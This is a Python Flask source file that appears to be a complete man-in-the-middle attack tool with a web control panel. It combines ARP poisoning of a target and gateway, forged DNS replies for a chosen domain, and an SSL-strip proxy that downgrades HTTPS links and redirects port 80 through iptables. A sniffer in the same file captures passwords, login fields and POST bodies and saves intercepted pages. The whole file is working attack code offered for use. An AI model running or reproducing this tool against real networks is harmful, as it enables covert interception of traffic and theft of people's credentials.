from flask import Flask, render_template, jsonify, request, Response
import threading
import time
import scapy.all as scapy
from scapy.layers.dns import DNS, DNSQR, DNSRR
import sys
import os
import signal
import re 
import uuid 
import socket
import ssl
import select

# --- CONFIGURATION: Disable Scapy Checksums for VM Compatibility ---
scapy.conf.checkIPaddr = False
# -------------------------------------------------------------------

app = Flask(__name__)

# --- GLOBAL STATE ---
STOP_EVENT = threading.Event()
ATTACK_THREAD = None
SNIFFER_THREAD = None
DNS_SPOOF_THREAD = None
SSL_STRIP_THREAD = None

# SSL Strip Configuration
SSL_STRIP_PORT = 10000 

# Create directory for captured files
CAPTURE_DIR = "captured_pages"
if not os.path.exists(CAPTURE_DIR):
    os.makedirs(CAPTURE_DIR)

STATUS = {
    "state": "IDLE",
    "mode": "NONE",
    "target": "192.168.1.20",
    "gateway": "192.168.1.1",
    "interface": "eth0",
    "packets": 0,
    "target_mac": "N/A",
    "logs": ["[SYSTEM] Ready."],
    "intercepted_data": [],
    "dns_domain": "",
    "dns_ip": ""
}

# --- UTILITY FUNCTIONS ---
def log_msg(message):
    timestamp = time.strftime('%H:%M:%S')
    full_msg = f"[{timestamp}] {message}"
    if len(STATUS["logs"]) > 50: STATUS["logs"].pop(0)
    STATUS["logs"].append(full_msg)
    print(full_msg)

def set_ip_forwarding(value):
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write(str(value))
    except: pass

def set_port_forwarding(enable):
    """ Used only for SSL Strip mode to redirect Port 80 -> 10000 """
    try:
        action = "-A" if enable else "-D"
        cmd = f"iptables -t nat {action} PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
        os.system(cmd)
        log_msg(f"[SYSTEM] IP Tables rule {'ADDED' if enable else 'REMOVED'} for SSL Strip.")
    except Exception as e:
        log_msg(f"[!] IP Tables Error: {e}")

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=STATUS["interface"])[0]
        return answered_list[0][1].hwsrc if answered_list else None
    except: return None

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False, iface=STATUS["interface"])

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False, iface=STATUS["interface"])

# --- DNS SPOOFING (From your working code) ---
def dns_spoofer(packet):
    if STOP_EVENT.is_set(): return
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        try:
            qname = packet[DNSQR].qname.decode('utf-8')
            target_domain = STATUS.get("dns_domain")
            fake_ip = STATUS.get("dns_ip")
            
            # Check if the domain matches
            if target_domain and target_domain in qname:
                log_msg(f"Trapped DNS: {qname}")
                
                # Craft the spoofed response
                scapy_ip = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src)
                scapy_udp = scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport)
                scapy_dns = scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd, 
                                      an=scapy.DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=fake_ip))
                spoofed_pkt = scapy_ip / scapy_udp / scapy_dns
                
                # Let Scapy recalculate checksums
                del spoofed_pkt[scapy.IP].len
                del spoofed_pkt[scapy.IP].chksum
                del spoofed_pkt[scapy.UDP].len
                del spoofed_pkt[scapy.UDP].chksum
                
                scapy.send(spoofed_pkt, verbose=False, iface=STATUS["interface"])
                log_msg(f"Sent DNS Reply -> {fake_ip}")
        except: pass

def start_dns_spoofing():
    # Only listens on UDP 53 to avoid conflict with the main sniffer
    scapy.sniff(filter="udp port 53", prn=dns_spoofer, iface=STATUS["interface"], stop_filter=lambda x: STOP_EVENT.is_set())

# --- SSL STRIP PROXY ---
def handle_client_connection(client_socket):
    try:
        request_data = client_socket.recv(4096)
        if not request_data: return

        try:
            headers = request_data.decode('utf-8', errors='ignore').split('\r\n')
            host = None
            for line in headers:
                if line.lower().startswith("host:"):
                    host = line.split(" ")[1].strip()
                    break
        except: host = None

        if host:
            # Try HTTPS first, fall back to HTTP if needed
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE 
                server_sock = socket.create_connection((host, 443), timeout=4)
                secure_sock = context.wrap_socket(server_sock, server_hostname=host)
            except:
                # If HTTPS fails (local server), try HTTP port 80
                secure_sock = socket.create_connection((host, 80), timeout=4)

            with secure_sock:
                # Remove compression and keep-alive to make manipulation easier
                modified_req = re.sub(rb'Accept-Encoding:.*?\r\n', b'', request_data)
                modified_req = modified_req.replace(b'Connection: keep-alive', b'Connection: close')
                
                secure_sock.sendall(modified_req)
                
                response_data = b""
                while True:
                    try:
                        chunk = secure_sock.recv(4096)
                        if not chunk: break
                        response_data += chunk
                    except: break
                
                # --- STRIP SSL ---
                stripped_response = response_data.replace(b'https://', b'http://')
                
                # Check for creds in the stripped data
                if b"password" in request_data.lower() or b"login" in request_data.lower():
                    log_msg(f"[ALERT] SSL STRIP: Potential Creds found for {host}")
                    STATUS["intercepted_data"].append({
                        "id": str(uuid.uuid4()),
                        "time": time.strftime('%H:%M:%S'),
                        "src": "SSL_STRIP", "dst": host,
                        "snippet": f"[SSL STRIP DATA] {request_data[:100]}",
                        "type": "ALERT"
                    })

                client_socket.sendall(stripped_response)

    except Exception: pass
    finally:
        client_socket.close()

def run_ssl_strip():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('0.0.0.0', SSL_STRIP_PORT))
        server.listen(50)
        log_msg(f"[+] SSL Proxy listening on port {SSL_STRIP_PORT}")
        set_port_forwarding(True)
        
        while not STOP_EVENT.is_set():
            server.settimeout(1.0) 
            try:
                client_sock, addr = server.accept()
                t = threading.Thread(target=handle_client_connection, args=(client_sock,))
                t.daemon = True
                t.start()
            except socket.timeout: continue
            except: pass
    except Exception as e: log_msg(f"[!] FATAL SSL STRIP ERROR: {e}")
    finally:
        set_port_forwarding(False)
        try: server.close()
        except: pass

# --- GENERAL SNIFFER (From your working code) ---
def packet_callback(packet):
    if STOP_EVENT.is_set(): return 
    
    # We filter for Raw TCP to find HTTP/Creds
    if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP):
        try:
            payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            
            keywords = ["pass=", "password", "user=", "username", "login", "secret", "CONFIDENTIAL"]
            is_sensitive = False
            captured_secret = ""

            # Check for secrets
            if "POST " in payload:
                is_sensitive = True
                lines = payload.split('\n')
                captured_secret = lines[-1] if lines else "POST DATA"
            elif any(k in payload for k in keywords):
                is_sensitive = True
                for line in payload.split('\n'):
                    if any(k in line for k in keywords):
                        captured_secret = line.strip()
                        break
            
            # Check for HTML content (Websites)
            is_html = False
            if "<html>" in payload or "<!DOCTYPE html>" in payload:
                is_html = True
            
            # Check for general HTTP headers (Your "Small Requests")
            is_http_info = "HTTP" in payload

            if is_sensitive or is_html or is_http_info:
                src = packet[scapy.IP].src if packet.haslayer(scapy.IP) else "?"
                dst = packet[scapy.IP].dst if packet.haslayer(scapy.IP) else "?"
                
                pkt_id = str(uuid.uuid4())
                snippet = ""
                log_type = "INFO"

                if is_sensitive:
                    snippet = f"[SECRET] {captured_secret[:80]}"
                    log_type = "ALERT"
                    log_msg(f"[ALERT] CAPTURED CREDENTIALS from {src}")
                elif is_html:
                    snippet = f"[HTML] Captured Page Source ({len(payload)} bytes)"
                    log_type = "HTML"
                    log_msg(f"[INFO] Captured HTML from {src}")
                elif is_http_info:
                    snippet = payload.split('\r\n')[0][:80]
                    log_type = "INFO"

                # Save file for viewing
                with open(f"{CAPTURE_DIR}/{pkt_id}.html", "w", encoding="utf-8") as f:
                    f.write(payload)

                STATUS["intercepted_data"].append({
                    "id": pkt_id,
                    "time": time.strftime('%H:%M:%S'),
                    "src": src, "dst": dst, 
                    "snippet": snippet, 
                    "type": log_type
                })

        except: pass

# --- ATTACK LOOP (ARP SPOOF) ---
def run_attack_loop(target_ip, gateway_ip):
    STATUS["state"] = "RUNNING"
    STATUS["packets"] = 0
    set_ip_forwarding(1)
    os.system("sysctl -w net.ipv4.conf.all.send_redirects=0 > /dev/null")
    try:
        while not STOP_EVENT.is_set():
            target_mac = get_mac(target_ip)
            gateway_mac = get_mac(gateway_ip)
            if target_mac:
                if STATUS["target_mac"] == "N/A":
                    STATUS["target_mac"] = target_mac
                    log_msg(f"[+] RESOLVED: Victim={target_mac}")
                spoof(target_ip, gateway_ip, target_mac)
                if gateway_mac: spoof(gateway_ip, target_ip, gateway_mac)
                STATUS["packets"] += 2
            else:
                pass # Silent fail
            time.sleep(2)
    except Exception as e: log_msg(f"ERROR: {e}")
    finally:
        log_msg("[-] Stopping... Restoring Network.")
        if get_mac(target_ip) and get_mac(gateway_ip):
            restore(target_ip, gateway_ip)
        set_ip_forwarding(0)
        # Ensure SSL rules are cleared if they were used
        set_port_forwarding(False)
        STATUS["state"] = "IDLE"
        STATUS["target_mac"] = "N/A"
        STATUS["mode"] = "NONE"
        STOP_EVENT.clear()

@app.route('/')
def index():
    if scapy.conf.iface is None: STATUS["interface"] = 'eth0'
    return render_template('index.html', data=STATUS)

@app.route('/update')
def update(): return jsonify(STATUS)

@app.route('/view/<pkt_id>')
def view_packet(pkt_id):
    try:
        with open(f"{CAPTURE_DIR}/{pkt_id}.html", "r", encoding="utf-8") as f:
            content = f.read()
        return Response(content, mimetype='text/html')
    except: return "File not found."

@app.route('/action', methods=['POST'])
def action():
    global ATTACK_THREAD, SNIFFER_THREAD, DNS_SPOOF_THREAD, SSL_STRIP_THREAD
    req = request.json
    action_type = req.get('action')
    
    if 'start' in action_type:
        if STATUS["state"] == "RUNNING":
            return jsonify({"status": "error", "message": "Attack running!"})
        
        STATUS["target"] = req.get('target')
        STATUS["gateway"] = req.get('gateway')
        STATUS["interface"] = req.get('interface')
        STATUS["dns_domain"] = req.get('dns_domain')
        STATUS["dns_ip"] = req.get('dns_ip')
        scapy.conf.iface = STATUS["interface"]
        
        STOP_EVENT.clear()
        
        # 1. ALWAYS Start the Sniffer (Restores logs for small HTTP requests)
        # This listens for TCP/80 and captures HTML/Post data directly from wire
        if SNIFFER_THREAD is None or not SNIFFER_THREAD.is_alive():
            SNIFFER_THREAD = threading.Thread(target=scapy.sniff, kwargs={'iface': STATUS["interface"], 'store': 0, 'prn': packet_callback})
            SNIFFER_THREAD.daemon = True
            SNIFFER_THREAD.start()

        # 2. Start Modules based on selection
        if action_type == 'start_dns':
            STATUS["mode"] = "DNS SPOOF"
            DNS_SPOOF_THREAD = threading.Thread(target=start_dns_spoofing)
            DNS_SPOOF_THREAD.daemon = True
            DNS_SPOOF_THREAD.start()
            log_msg(f"[+] DNS Attack: {STATUS['dns_domain']} -> {STATUS['dns_ip']}")

        elif action_type == 'start_sslstrip':
            STATUS["mode"] = "SSL STRIP"
            SSL_STRIP_THREAD = threading.Thread(target=run_ssl_strip)
            SSL_STRIP_THREAD.daemon = True
            SSL_STRIP_THREAD.start()
            log_msg(f"[+] SSL Strip Mode Activated")
        
        else:
            STATUS["mode"] = "ARP SNIFF"
            log_msg("[+] ARP Attack Started")

        # 3. ALWAYS Start ARP Spoofing
        ATTACK_THREAD = threading.Thread(target=run_attack_loop, args=(STATUS["target"], STATUS["gateway"]))
        ATTACK_THREAD.daemon = True
        ATTACK_THREAD.start()
        
        return jsonify({"status": "success"})
    
    elif action_type == 'stop':
        STOP_EVENT.set()
        set_port_forwarding(False)
        return jsonify({"status": "success", "message": "Stopping..."})
    
    return jsonify({"status": "error", "message": "Invalid action."})

if __name__ == '__main__':
    scapy.conf.iface = STATUS["interface"]
    app.run(host='0.0.0.0', port=5000, debug=False)